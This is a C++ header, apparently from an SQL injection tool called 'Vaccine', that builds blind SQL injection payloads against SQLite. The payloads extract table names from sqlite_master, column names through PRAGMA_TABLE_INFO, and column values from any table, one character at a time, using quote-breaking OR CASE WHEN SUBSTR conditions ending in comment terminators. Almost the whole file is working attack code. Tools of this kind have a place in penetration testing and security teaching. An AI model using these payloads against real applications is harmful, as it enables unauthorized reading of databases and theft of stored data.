#ifndef SQLITE_TIME_BASED
#define SQLITE_TIME_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct sqlite_time_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                switch (type)
                {
                case TABLES:
                        return "' OR CASE WHEN SUBSTR(("
                               "SELECT name "
                               "FROM sqlite_master "
                               "WHERE type='table' "
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                case COLUMNS:
                        return "' OR CASE WHEN SUBSTR(("
                               "SELECT name "
                               "FROM PRAGMA_TABLE_INFO('" +
                               *config[TIME_BASED_TABLE] +
                               "') LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                case VALUES:
                        return "' OR CASE WHEN SUBSTR((SELECT " +
                               *config[TIME_BASED_COLUMN] + " " +
                               "FROM " + *config[TIME_BASED_TABLE] +
                               " LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                default:
                        return std::string();
                }
        };
};
#endif
